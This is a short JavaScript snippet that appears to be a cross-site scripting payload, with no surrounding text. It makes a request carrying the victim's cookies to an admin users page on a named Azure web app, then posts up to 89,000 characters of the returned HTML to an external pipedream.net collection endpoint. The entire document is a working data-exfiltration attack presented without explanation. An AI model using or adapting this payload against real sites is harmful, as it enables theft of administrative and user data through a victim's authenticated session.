var xhr = new XMLHttpRequest();

xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/users', true);

xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

        var http = new XMLHttpRequest();
        var url = "https://enxg7v5ip50sd.x.pipedream.net/users";
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if (http.readyState == 4 && http.status == 200) {

            }
        };
        
           page_data = {
                    "page_html": xhr.responseText.substring(0,89000),
                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_admins'
                };
        http.send(JSON.stringify(page_data));



  }
};
xhr.send(null);
